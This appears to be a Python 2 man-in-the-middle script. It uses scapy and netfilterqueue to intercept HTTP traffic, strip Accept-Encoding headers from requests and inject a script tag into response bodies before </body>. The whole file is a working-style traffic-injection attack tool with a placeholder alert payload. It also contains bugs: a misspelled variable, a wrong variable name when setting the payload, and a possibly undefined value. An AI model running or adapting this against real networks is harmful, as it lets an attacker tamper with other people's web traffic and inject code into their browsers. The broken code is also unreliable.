#!/usr/bin/env python

import sys
import signal
import scapy.all as scapy
import re
import netfilterqueue

def def_handler(sig, frame):
    print '\n[!] Exiting...\n'
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def set_load(package, load):
    package[scapy.Raw].load = load
    
    del package[scapy.IP].len
    del package[scapy.IP].chksum
    del package[scapy.TCP].chksum
    
    return package

def process_packet(package):
    scapy_packet = scapy.IP(package.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        if scaoy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
        
        new_packet = set_load(scapy_packet, modified_load)
        packet.set_payload(new_packet.build())

    package.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
